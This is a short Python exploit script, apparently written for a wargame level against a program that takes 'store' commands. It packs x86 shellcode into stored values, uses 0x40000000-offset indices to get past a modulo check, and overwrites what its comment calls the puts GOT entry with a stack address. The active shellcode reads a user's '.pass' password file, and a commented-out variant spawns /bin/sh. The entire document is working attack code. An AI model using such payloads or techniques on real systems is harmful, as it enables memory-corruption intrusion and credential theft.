# shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
shellcode = '\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x38\x2f\x2f\x2e\x68\x76\x65\x6c\x30\x68\x2f\x2f\x6c\x65\x68\x73\x65\x72\x73\x68\x65\x2f\x2f\x75\x68\x2f\x68\x6f\x6d\x89\xe3\x50\x31\xc9\xb0\x05\xcd\x80\x89\xc3\xb0\x03\x8d\x4c\x24\x29\xb2\x29\xcd\x80\xb0\x04\xb3\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\x90'
shellcode_address = '4294956396'    # 0xffffd56c
puts_offset = '33632938'            #( 0x10804a014 - 0xffffd56c) >> 2 = 20132AA = 33632938

l = len(shellcode) / 4
s = 100 - l

k = 0
for i in range(100):
    print("store")
    if i < s:
        print(0x90909090)
    else:
        o = 0
        for j in reversed(range(4)):
            x = ord(shellcode[k + j])
            o = (o << 8) | x
        k = k + 4
        print(o)
        
    
    if (i % 3) == 0:
        print(0x40000000 + i)
    else:
        print(i)

print('store')
print(shellcode_address)
print(puts_offset)

print('store')
print('1337')
print('3')